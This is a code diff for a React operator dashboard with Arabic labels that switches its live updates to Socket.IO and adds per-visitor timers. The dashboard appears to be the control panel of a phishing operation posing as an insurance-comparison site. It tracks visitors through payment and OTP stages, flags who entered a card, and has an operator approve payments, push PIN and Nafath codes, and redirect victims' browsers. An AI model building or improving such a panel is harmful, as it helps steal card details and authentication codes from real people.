@@ -1,4 +1,5 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useState, useRef, useCallback } from "react";
+import { io, Socket } from "socket.io-client";
 import { addData } from "@/lib/api";
 
 type RequestItem = {
@@ -7,6 +8,7 @@ type RequestItem = {
   status: string;
   stage: string;
   updated: string;
+  updatedAt?: string;
   badge?: string;
   visitorId?: string;
   submittedAt?: string;
@@ -28,6 +30,33 @@ const countryCodes: Record<string, string> = {
   sa: "SA", ksa: "SA", jo: "JO", ae: "AE", eg: "EG", om: "OM", lb: "LB", sy: "SY",
 };
 
+// Format elapsed time since last update
+function formatElapsedTime(isoString?: string): string {
+  if (!isoString) return "—";
+  const diff = Date.now() - new Date(isoString).getTime();
+  if (diff < 0) return "الآن";
+  const seconds = Math.floor(diff / 1000);
+  if (seconds < 60) return `${seconds}ث`;
+  const minutes = Math.floor(seconds / 60);
+  if (minutes < 60) return `${minutes}د ${seconds % 60}ث`;
+  const hours = Math.floor(minutes / 60);
+  return `${hours}س ${minutes % 60}د`;
+}
+
+// Live timer component for each request
+function LiveTimer({ startTime }: { startTime: string }) {
+  const [elapsed, setElapsed] = useState(formatElapsedTime(startTime));
+  
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setElapsed(formatElapsedTime(startTime));
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [startTime]);
+  
+  return <span style={{ fontFamily: "monospace", fontSize: "0.85rem" }}>{elapsed}</span>;
+}
+
 export default function DashboardPage() {
   const [requests, setRequests] = useState<RequestItem[]>([]);
   const [selectedRequestId, setSelectedRequestId] = useState<string | null>(null);
@@ -39,6 +68,8 @@ export default function DashboardPage() {
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
   const [redirectPage, setRedirectPage] = useState("");
+  const socketRef = useRef<Socket | null>(null);
+  const currentTimeRef = useRef(Date.now());
 
   // Page options for manual redirect
   const pageOptions = [
@@ -62,93 +93,90 @@ export default function DashboardPage() {
     return { total, newCount, pendingCount, completedCount };
   }, [requests]);
 
-  // Load requests from API
-  const loadRequests = () => {
-    fetch("/api/dashboard/requests")
-      .then((res) => res.json())
-      .then((data) => {
-        if (Array.isArray(data)) {
-          setRequests(data);
-          // Update selectedRequest if it exists in the new data
-          if (selectedRequestId) {
-            const updated = data.find((r: any) => r.id === selectedRequestId || r.visitorId === selectedRequestId);
-            if (updated) {
-              setSelectedRequestId(updated.id);
-            }
-          }
-        }
-      })
-      .catch(() => {});
-  };
+  // Sort requests by updatedAt (newest first)
+  const sortedRequests = useMemo(() => {
+    return [...requests].sort((a, b) => {
+      const timeA = new Date(a.updatedAt || a.submittedAt || 0).getTime();
+      const timeB = new Date(b.updatedAt || b.submittedAt || 0).getTime();
+      return timeB - timeA; // Descending order (newest first)
+    });
+  }, [requests]);
 
-  // Handle SSE update - update specific request in state
-  const handleSSEUpdate = (updatedRequest: any) => {
+  // Handle Socket.IO update
+  const handleSocketUpdate = useCallback((updatedRequest: any) => {
+    // Add updatedAt timestamp if not present
+    if (!updatedRequest.updatedAt) {
+      updatedRequest.updatedAt = new Date().toISOString();
+    }
+    
     setRequests(prevRequests => {
       const existingIndex = prevRequests.findIndex(
-        (r: any) => r.id === updatedRequest.id || r.visitorId === updatedRequest.visitorId
+        (r) => r.id === updatedRequest.id || r.visitorId === updatedRequest.visitorId
       );
       
       if (existingIndex >= 0) {
-        // Update existing request
         const newRequests = [...prevRequests];
         newRequests[existingIndex] = updatedRequest;
         return newRequests;
       } else {
-        // Add new request at the top
         return [updatedRequest, ...prevRequests];
       }
     });
     
-    // Update selected request if it's the one being updated
     if (selectedRequestId && (updatedRequest.id === selectedRequestId || updatedRequest.visitorId === selectedRequestId)) {
       setSelectedRequestId(updatedRequest.id);
     }
-  };
-
-  useEffect(() => {
-    // Initial load
-    loadRequests();
-    
-    // Connect to SSE for real-time updates
-    let eventSource: EventSource | null = null;
-    
-    const connectSSE = () => {
-      eventSource = new EventSource('/api/dashboard/stream');
-      
-      eventSource.onopen = () => {
-        console.log('[Dashboard] Connected to real-time updates');
-      };
-      
-      eventSource.addEventListener('update', (event) => {
-        try {
-          const data = JSON.parse(event.data);
-          console.log('[Dashboard] Received update:', data);
-          handleSSEUpdate(data);
-        } catch (e) {
-          console.error('[Dashboard] Failed to parse SSE update:', e);
-        }
-      });
-      
-      eventSource.onerror = () => {
-        console.log('[Dashboard] SSE connection error, will reconnect...');
-        eventSource?.close();
-        // Reconnect after 3 seconds
-        setTimeout(connectSSE, 3000);
-      };
-    };
-    
-    connectSSE();
-    
-    return () => {
-      if (eventSource) {
-        eventSource.close();
-      }
-    };
   }, [selectedRequestId]);
 
+  // Socket.IO connection
   useEffect(() => {
-    const timer = setInterval(() => setNowTick(Date.now()), 60000);
-    return () => clearInterval(timer);
+    // Create Socket.IO connection
+    const socket = io("/", {
+      transports: ["websocket", "polling"],
+      reconnection: true,
+      reconnectionDelay: 1000,
+      reconnectionAttempts: Infinity,
+    });
+    
+    socketRef.current = socket;
+    
+    socket.on("connect", () => {
+      console.log("[Dashboard] Socket.IO connected:", socket.id);
+    });
+    
+    // Handle initial data from server
+    socket.on("dashboard:init", (data: RequestItem[]) => {
+      console.log("[Dashboard] Received initial data:", data.length, "requests");
+      setRequests(data);
+    });
+    
+    // Handle real-time updates
+    socket.on("dashboard:update", (updatedRequest: RequestItem) => {
+      console.log("[Dashboard] Received update:", updatedRequest.id);
+      handleSocketUpdate(updatedRequest);
+    });
+    
+    socket.on("disconnect", () => {
+      console.log("[Dashboard] Socket.IO disconnected");
+    });
+    
+    socket.on("connect_error", (error) => {
+      console.log("[Dashboard] Socket.IO connection error:", error.message);
+    });
+    
+    return () => {
+      socket.disconnect();
+      socketRef.current = null;
+    };
+  }, [handleSocketUpdate]);
+
+  // Update current time every second for timers
+  useEffect(() => {
+    const interval = setInterval(() => {
+      currentTimeRef.current = Date.now();
+      setNowTick(Date.now());
+    }, 1000);
+    return () => clearInterval(interval);
   }, []);
 
   // Get country flag
@@ -185,9 +213,9 @@ export default function DashboardPage() {
 
   // Filter requests
   const filteredRequests = useMemo(() => {
-    let filtered = requests;
+    let filtered = sortedRequests;
     if (filterMode === "cards") {
-      filtered = requests.filter((r) => r.hasCard);
+      filtered = sortedRequests.filter((r) => r.hasCard);
     }
     if (searchQuery.trim()) {
       const query = searchQuery.toLowerCase();
@@ -200,7 +228,7 @@ export default function DashboardPage() {
       );
     }
     return filtered;
-  }, [requests, filterMode, searchQuery]);
+  }, [sortedRequests, filterMode, searchQuery]);
 
   const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];
 
@@ -223,7 +251,6 @@ export default function DashboardPage() {
       });
       if (res.ok) {
         showNotification("success", action === "approved" ? "تم الموافقة على الدفع" : "تم رفض الدفع");
-        loadRequests();
       } else {
         showNotification("error", "حدث خطأ");
       }
@@ -258,7 +285,6 @@ export default function DashboardPage() {
           resend: "تم إعادة إرسال رمز التحقق",
         };
         showNotification("success", messages[action]);
-        loadRequests();
       } else {
         showNotification("error", "حدث خطأ");
       }
@@ -281,7 +307,6 @@ export default function DashboardPage() {
       if (res.ok) {
         showNotification("success", "تم إرسال رمز PIN للعميل");
         setPinInput("");
-        loadRequests();
       } else {
         showNotification("error", "حدث خطأ");
       }
@@ -308,7 +333,6 @@ export default function DashboardPage() {
           resend: "تم إعادة إرسال رمز التحقق",
         };
         showNotification("success", messages[action]);
-        loadRequests();
       } else {
         showNotification("error", "حدث خطأ");
       }
@@ -330,7 +354,6 @@ export default function DashboardPage() {
       });
       if (res.ok) {
         showNotification("success", "تم إرسال رمز النفاذ للعميل");
-        loadRequests();
       } else {
         showNotification("error", "حدث خطأ");
       }
@@ -356,7 +379,6 @@ export default function DashboardPage() {
         const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
         showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
         setRedirectPage("");
-        loadRequests();
       } else {
         showNotification("error", "حدث خطأ");
       }
@@ -1012,57 +1034,70 @@ export default function DashboardPage() {
             </div>
           </div>
 
-          {/* Visitor List */}
+          {/* Visitor List - Sorted by newest first */}
           <div style={{ flex: 1, overflowY: "auto" }}>
             {filteredRequests.map((item) => (
               <div
                 key={item.id}
                 onClick={() => setSelectedRequestId(item.id)}
                 style={{
-                  padding: "12px 16px",
+                  padding: "16px",
                   borderBottom: "1px solid #f3f4f6",
-                  background: selectedRequestId === item.id ? "#f0f9ff" : "#fff",
+                  background: selectedRequestId === item.id ? "#e0f2fe" : "#fff",
                   cursor: "pointer",
                   transition: "background 0.2s",
                 }}
               >
-                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                   <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                    <span style={{ fontSize: "1.2rem" }}>{getCountryFlag(item.raw)}</span>
-                    <span style={{ fontWeight: 700, fontSize: "0.9rem", color: "#111827" }}>{item.customer}</span>
+                    <span style={{ fontSize: "1.3rem" }}>{getCountryFlag(item.raw)}</span>
+                    <span style={{ fontWeight: 700, fontSize: "1rem", color: "#111827" }}>{item.customer}</span>
+                  </div>
+                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                    <span style={{ 
+                      background: "#f3f4f6", 
+                      padding: "4px 8px", 
+                      borderRadius: 6,
+                      fontSize: "0.8rem",
+                      fontWeight: 600
+                    }}>
+                      ⏱️ <LiveTimer startTime={item.updatedAt || item.submittedAt || ""} />
+                    </span>
+                  </div>
+                </div>
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                  <div
+                    style={{
+                      display: "inline-block",
+                      padding: "4px 12px",
+                      borderRadius: 6,
+                      fontSize: "0.8rem",
+                      fontWeight: 600,
+                      background:
+                        item.stage === "الدفع"
+                          ? "#dbeafe"
+                          : item.stage === "التأمين"
+                            ? "#fef3c7"
+                            : item.stage === "مقارنة"
+                              ? "#f3e8ff"
+                              : item.stage === "OTP"
+                                ? "#fee2e2"
+                                : "#e0f2fe",
+                      color:
+                        item.stage === "الدفع"
+                          ? "#2563eb"
+                          : item.stage === "التأمين"
+                            ? "#d97706"
+                            : item.stage === "مقارنة"
+                              ? "#9333ea"
+                              : item.stage === "OTP"
+                                ? "#dc2626"
+                                : "#0284c7",
+                    }}
+                  >
+                    {item.stage}
                   </div>
                   <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>{item.updated}</span>
-                </div>
-                <div
-                  style={{
-                    display: "inline-block",
-                    padding: "2px 10px",
-                    borderRadius: 4,
-                    fontSize: "0.75rem",
-                    fontWeight: 600,
-                    background:
-                      item.stage === "الدفع"
-                        ? "#dbeafe"
-                        : item.stage === "التأمين"
-                          ? "#fef3c7"
-                          : item.stage === "مقارنة"
-                            ? "#f3e8ff"
-                            : item.stage === "OTP"
-                              ? "#fee2e2"
-                              : "#e0f2fe",
-                    color:
-                      item.stage === "الدفع"
-                        ? "#2563eb"
-                        : item.stage === "التأمين"
-                          ? "#d97706"
-                          : item.stage === "مقارنة"
-                            ? "#9333ea"
-                            : item.stage === "OTP"
-                              ? "#dc2626"
-                              : "#0284c7",
-                  }}
-                >
-                  {item.stage}
                 </div>
               </div>
             ))}
@@ -1142,7 +1177,6 @@ export default function DashboardPage() {
                         if (res.ok) {
                           const pageLabel = pageOptions.find(p => p.value === selectedPage)?.label || selectedPage;
                           showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
-                          loadRequests();
                         } else {
                           showNotification("error", "حدث خطأ");
                         }
